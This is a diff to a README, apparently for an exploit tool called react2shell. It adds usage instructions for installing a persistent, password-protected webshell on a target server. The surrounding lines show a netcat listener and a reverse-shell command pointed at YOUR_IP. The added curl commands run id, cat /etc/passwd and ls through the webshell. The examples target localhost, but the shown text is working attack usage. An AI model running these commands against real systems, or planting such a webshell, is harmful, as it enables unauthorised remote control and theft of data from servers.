@@ -132,6 +132,20 @@ nc -lvnp 4444
 python ../cli/react2shell.py http://localhost:3011 -r -l YOUR_IP -p 4444
 ```
 
+### Webshell Installation
+```bash
+# Install persistent webshell on port 1337
+python ../cli/react2shell.py http://localhost:3011 --webshell secretpass
+
+# Access webshell via curl (URL encode spaces with %20)
+curl 'http://localhost:1337/?p=secretpass&cmd=id'
+curl 'http://localhost:1337/?p=secretpass&cmd=cat%20/etc/passwd'
+curl 'http://localhost:1337/?p=secretpass&cmd=ls%20-la%20/'
+
+# Or use --data-urlencode for complex commands
+curl -G 'http://localhost:1337/' --data-urlencode 'p=secretpass' --data-urlencode 'cmd=ps aux | grep node'
+```
+
 ## Architecture
 
 ```
